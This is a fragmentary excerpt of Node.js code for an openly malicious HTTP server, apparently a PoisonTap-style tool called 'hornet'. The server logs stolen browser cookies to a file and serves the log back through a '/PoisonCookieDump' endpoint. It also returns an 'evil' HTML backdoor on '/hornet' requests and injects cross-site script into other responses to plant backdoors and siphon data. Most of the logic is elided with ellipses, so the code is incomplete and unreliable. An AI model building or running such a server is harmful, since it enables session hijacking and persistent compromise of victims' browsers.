...
var log_file = fs.createWriteStream(__dirname + '/hornet.cookies.log', {flags : 'a'});
...
if (!xhtml)
{
	console.log("Couldn't read hornet evil html");
	process.exit();
}
...
var server = http.createServer(function(request, response) {
	...
	// if this is a hornet request, we just siphoned cookies, now drop html backdoor
	else if (url.indexOf('/hornet') != -1)
	{
	...
	else if (url.indexOf('/PoisonCookieDump') != -1)
	{
		...
		response.writeHead(200, headers);
		response.write(fs.readFileSync(__dirname + '/hornet.cookies.log'));
		response.end();
		return;
	}
  ...
  // random AJAX request or load from a page, give our evil content that loads all the backdoors and siphons all the things
	else
	{
		...
		// NOT hornet hit, inject cross-js/html file
...
console.log("hornet is listening");
